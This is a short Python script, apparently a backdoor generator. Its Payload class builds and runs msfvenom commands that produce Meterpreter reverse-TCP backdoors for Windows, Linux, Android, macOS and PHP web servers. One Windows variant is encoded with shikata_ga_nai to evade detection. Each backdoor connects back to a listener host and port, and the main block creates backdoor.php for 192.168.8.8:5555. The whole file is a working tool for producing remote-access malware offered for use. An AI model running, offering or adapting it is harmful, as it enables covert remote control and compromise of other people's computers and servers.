import os 
class Payload(object):
    """docstring for Payload."""
    def __init__(self,host,port):
        self._lhost = host 
        self._lport = port   
    
    @property
    def lhost(self):
        return self._lhost
    @lhost.setter
    def lhost(self,host):
        self._lhost = host
    payloads = {
        "windows" : "msfvenom -p windows/meterpreter/reverse_tcp lhost={}  lport={}  -f exe > backdoor.exe",
        "windwos_ofuscate": "msfvenom -p windows/meterpreter/reverse_tcp lhost={}  lport={}  -f raw -e x86/shikata_ga_nai -i 5 -o backdoorOfuscate.exe",
        "linux":"msfvenom -p linux/x86/meterpreter_reverse_tcp lhost={} lport={} > backdoor.bin",
        "android":"msfvenom -p  android/meterpreter/reverse_tcp lhost={} lport={} > backdoor.apk",
        "mac_os":"msfvenom -p  java/meterpreter/reverse_tcp lhost={} lport={} -f jar > backdoor.jar",
        "web":"msfvenom -p  php/meterpreter/reverse_tcp lhost={} lport={} > backdoor.php"

    }
    
    def createBackdoorWindows(self,ofuscate=False):
        os.system(self.payloads["windwos_ofuscate"].format(self._lhost,self._lport)) if ofuscate else  os.system(self.payloads["windows"].format(self._lhost,self._lport))
    
    def createBackdoorLinux(self):
        os.system(self.payloads['linux'].format(self._lhost,self._lport))
    
    def createBackdoorAndroid(self):
        os.system(self.payloads['android'].format(self._lhost,self._lport))
    
    def createBackdoorMacOs(self):
        os.system(self.payloads['mac_os'].format(self._lhost,self._lport))
    
    def createBackdoorWeb(self): 
        os.system(self.payloads['web'].format(self._lhost,self._lport))



if __name__ == '__main__':
    payload = Payload("192.168.8.8","5555")
    payload.createBackdoorWeb()
